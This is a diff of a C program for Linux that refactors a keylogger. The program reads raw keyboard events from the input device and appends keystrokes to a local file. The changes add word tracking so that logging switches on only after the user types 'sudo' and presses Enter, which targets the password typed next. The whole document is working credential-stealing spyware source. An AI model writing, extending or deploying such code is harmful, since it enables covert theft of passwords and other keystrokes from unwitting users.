@@ -1,17 +1,4 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <linux/input.h>
-
-#define FILE_OUTPUT "output.txt"
-#define BUFFER_SIZE 128
-int inCapsLock = 0;
-
-char *currentWord = NULL;
-
-#define DEBUG_MODE 0
+#include "../includes/keyLogger.h"
 
 char *findKeyboardDevice()
 {
@@ -40,11 +27,11 @@ char *findKeyboardDevice()
   return device;
 }
 
-char *printKey(signed int code)
+char *printKey(KeyLogger *keyLogger)
 {
   char *key = NULL;
 
-  switch (code)
+  switch (keyLogger->ev.code)
   {
   // Numbers
   case 2:
@@ -80,82 +67,82 @@ char *printKey(signed int code)
 
     // Letters -> layout QWERTY
   case 16:
-    key = inCapsLock ? "Q" : "q";
+    key = keyLogger->inCapsLock ? "Q" : "q";
     break;
   case 17:
-    key = inCapsLock ? "W" : "w";
+    key = keyLogger->inCapsLock ? "W" : "w";
     break;
   case 18:
-    key = inCapsLock ? "E" : "e";
+    key = keyLogger->inCapsLock ? "E" : "e";
     break;
   case 19:
-    key = inCapsLock ? "R" : "r";
+    key = keyLogger->inCapsLock ? "R" : "r";
     break;
   case 20:
-    key = inCapsLock ? "T" : "t";
+    key = keyLogger->inCapsLock ? "T" : "t";
     break;
   case 21:
-    key = inCapsLock ? "Y" : "y";
+    key = keyLogger->inCapsLock ? "Y" : "y";
     break;
   case 22:
-    key = inCapsLock ? "U" : "u";
+    key = keyLogger->inCapsLock ? "U" : "u";
     break;
   case 23:
-    key = inCapsLock ? "I" : "i";
+    key = keyLogger->inCapsLock ? "I" : "i";
     break;
   case 24:
-    key = inCapsLock ? "O" : "o";
+    key = keyLogger->inCapsLock ? "O" : "o";
     break;
   case 25:
-    key = inCapsLock ? "P" : "p";
+    key = keyLogger->inCapsLock ? "P" : "p";
     break;
   case 30:
-    key = inCapsLock ? "A" : "a";
+    key = keyLogger->inCapsLock ? "A" : "a";
     break;
   case 31:
-    key = inCapsLock ? "S" : "s";
+    key = keyLogger->inCapsLock ? "S" : "s";
     break;
   case 32:
-    key = inCapsLock ? "D" : "d";
+    key = keyLogger->inCapsLock ? "D" : "d";
     break;
   case 33:
-    key = inCapsLock ? "F" : "f";
+    key = keyLogger->inCapsLock ? "F" : "f";
     break;
   case 34:
-    key = inCapsLock ? "G" : "g";
+    key = keyLogger->inCapsLock ? "G" : "g";
     break;
   case 35:
-    key = inCapsLock ? "H" : "h";
+    key = keyLogger->inCapsLock ? "H" : "h";
     break;
   case 36:
-    key = inCapsLock ? "J" : "j";
+    key = keyLogger->inCapsLock ? "J" : "j";
     break;
   case 37:
-    key = inCapsLock ? "K" : "k";
+    key = keyLogger->inCapsLock ? "K" : "k";
     break;
   case 38:
-    key = inCapsLock ? "L" : "l";
+    key = keyLogger->inCapsLock ? "L" : "l";
     break;
   case 44:
-    key = inCapsLock ? "Z" : "z";
+    key = keyLogger->inCapsLock ? "Z" : "z";
     break;
   case 45:
-    key = inCapsLock ? "X" : "x";
+    key = keyLogger->inCapsLock ? "X" : "x";
     break;
   case 46:
-    key = inCapsLock ? "C" : "c";
+    key = keyLogger->inCapsLock ? "C" : "c";
     break;
   case 47:
-    key = inCapsLock ? "V" : "v";
+    key = keyLogger->inCapsLock ? "V" : "v";
     break;
   case 48:
-    key = inCapsLock ? "B" : "b";
+    key = keyLogger->inCapsLock ? "B" : "b";
     break;
   case 49:
-    key = inCapsLock ? "N" : "n";
+    key = keyLogger->inCapsLock ? "N" : "n";
     break;
   case 50:
-    key = inCapsLock ? "M" : "m";
+    key = keyLogger->inCapsLock ? "M" : "m";
     break;
 
   // Special characters
@@ -188,7 +175,7 @@ char *printKey(signed int code)
     break;
   case 58:
     key = "CapsLock";
-    inCapsLock = inCapsLock == 0 ? 1 : 0;
+    keyLogger->inCapsLock = keyLogger->inCapsLock == 0 ? 1 : 0;
     break;
 
   default:
@@ -198,66 +185,156 @@ char *printKey(signed int code)
   }
   }
 
-  DEBUG_MODE == 1 ? printf("CapsLock: %s\n", inCapsLock == 1 ? "Active" : "Desactive") : 0;
-
   return key;
 }
 
-void writeToFile(struct input_event *ev)
+void writeToFile(KeyLogger *keyLogger)
 {
-  FILE *file = fopen(FILE_OUTPUT, "a");
-  if (file == NULL)
+  if (keyLogger->ev.type == EV_KEY && keyLogger->ev.value == 1)
   {
-    DEBUG_MODE == 1 ? fprintf(stderr, "file not open %s\n", FILE_OUTPUT) : 0;
-    return;
-  }
 
-  if (ev == NULL)
-  {
-    return;
-  }
+    FILE *file = fopen(FILE_OUTPUT, "a");
+    if (file == NULL)
+    {
+      DEBUG_MODE == 1 ? fprintf(stderr, "file not open %s\n", FILE_OUTPUT) : 0;
+      return;
+    }
 
-  switch (ev->code)
-  {
+    switch (keyLogger->ev.code)
+    {
     case KEY_ENTER:
-      fprintf(file, "%s", " (Enter)\n");
+      fprintf(file, "%s", "(Enter)\n");
       break;
     case KEY_SPACE:
       fprintf(file, "%s", " ");
       break;
     case KEY_BACKSPACE:
-      fprintf(file, "%s", " (Backspace)");
+      fprintf(file, "%s", "(Backspace)");
       break;
     case KEY_TAB:
       fprintf(file, "%s", "    ");
       break;
     default:
     {
-      char *text = printKey(ev->code);
+      char *text = printKey(keyLogger);
       fprintf(file, "%s", text);
       break;
     }
-  }
+    }
 
-  fclose(file);
+    fclose(file);
+  }
 }
 
-void printKeyPressed(struct input_event *ev)
+KeyLogger *createKeyLogger()
 {
-  if (ev->type == EV_KEY && ev->value == 1)
+  KeyLogger *keyLoger = (KeyLogger *)malloc(sizeof(KeyLogger));
+  if (keyLoger == NULL)
   {
-    DEBUG_MODE == 1 ? printf("Key press: %s\n", printKey(ev->code)) : 0;
-    writeToFile(ev);
+    return NULL;
+  }
+
+  keyLoger->currentWord = NULL;
+  keyLoger->inCapsLock = 0;
+  keyLoger->inShift = 0;
+  keyLoger->ev = (struct input_event){0};
+  keyLoger->inSudoCommand = 0;
+  keyLoger->listen = 0;
+
+  return keyLoger;
+}
+
+void mountWord(KeyLogger *keyLogger)
+{
+  if (keyLogger->ev.code == KEY_SPACE || keyLogger->ev.code == KEY_TAB)
+  {
+    free(keyLogger->currentWord);
+    keyLogger->currentWord = NULL;
+    return;
+  }
+
+  char *text = printKey(keyLogger);
+  if (text == NULL)
+  {
+    return;
+  }
+
+  if (keyLogger->ev.code == KEY_BACKSPACE)
+  {
+    if (keyLogger->currentWord != NULL && strlen(keyLogger->currentWord) > 0)
+    {
+      keyLogger->currentWord[strlen(keyLogger->currentWord) - 1] = '\0';
+    }
+    return;
+  }
+
+  if (keyLogger->ev.code == KEY_ENTER)
+  {
+    analyzeWord(keyLogger);
+    free(keyLogger->currentWord);
+    keyLogger->currentWord = NULL;
+    return;
+  }
+
+  if (keyLogger->currentWord == NULL)
+  {
+    keyLogger->currentWord = (char *)malloc(BUFFER_SIZE * sizeof(char));
+    if (keyLogger->currentWord == NULL)
+    {
+      return;
+    }
+    keyLogger->currentWord[0] = '\0';
+  }
+  else
+  {
+    size_t len = strlen(keyLogger->currentWord);
+    if (len > BUFFER_SIZE)
+    {
+      free(keyLogger->currentWord);
+      keyLogger->currentWord = NULL;
+      return;
+    }
+  }
+
+  strcat(keyLogger->currentWord, text);
+
+  if (DEBUG_MODE == 1)
+  {
+    printf("Word: %s\n", keyLogger->currentWord);
   }
 }
 
-int main()
+void analyzeWord(KeyLogger *keyLogger)
+{
+  if (keyLogger->currentWord == NULL)
+  {
+    return;
+  }
+
+  // check if the word is "sudo"
+  if (strcmp(keyLogger->currentWord, "sudo") == 0)
+  {
+    keyLogger->inSudoCommand = 1;
+  }
+
+  if (keyLogger->ev.code == KEY_ENTER && keyLogger->inSudoCommand == 1)
+  {
+    keyLogger->inSudoCommand = 0;
+    keyLogger->listen = 1;
+  }
+  else if (keyLogger->ev.code == KEY_ENTER && keyLogger->inSudoCommand == 0)
+  {
+    keyLogger->listen = 0;
+  }
+}
+
+void startKeyLogger(KeyLogger *keyLogger)
 {
   char *device = findKeyboardDevice();
   if (device == NULL)
   {
     DEBUG_MODE == 1 ? fprintf(stderr, "Not found keyboard\n") : 0;
-    return EXIT_FAILURE;
+    return;
   }
 
   DEBUG_MODE == 1 ? printf("Not found keyboard: %s\n", device) : 0;
@@ -267,7 +344,7 @@ int main()
   {
     DEBUG_MODE == 1 ? fprintf(stderr, "Not found keyboard %s\n", device) : 0;
     free(device);
-    return EXIT_FAILURE;
+    return;
   }
 
   struct input_event ev;
@@ -279,20 +356,47 @@ int main()
       DEBUG_MODE == 1 ? perror("Error in event") : 0;
       close(fd);
       free(device);
-      return EXIT_FAILURE;
+      return;
     }
     else if (n != sizeof ev)
     {
       DEBUG_MODE == 1 ? fprintf(stderr, "Wrong length\n") : 0;
       close(fd);
       free(device);
-      return EXIT_FAILURE;
+      return;
     }
 
-    printKeyPressed(&ev);
+    if (ev.type == EV_KEY && ev.value == 1)
+    {
+      keyLogger->ev = ev;
+      mountWord(keyLogger);
+      analyzeWord(keyLogger);
+
+      if (keyLogger->listen == 1)
+      {
+        writeToFile(keyLogger);
+      }
+    }
   }
 
   close(fd);
   free(device);
+}
+
+void destroyKeyLogger(KeyLogger *keyLogger)
+{
+  free(keyLogger);
+}
+
+int main()
+{
+  KeyLogger *keyLogger = createKeyLogger();
+
+  if (keyLogger == NULL)
+  {
+    return 1;
+  }
+
+  startKeyLogger(keyLogger);
   return 0;
 }
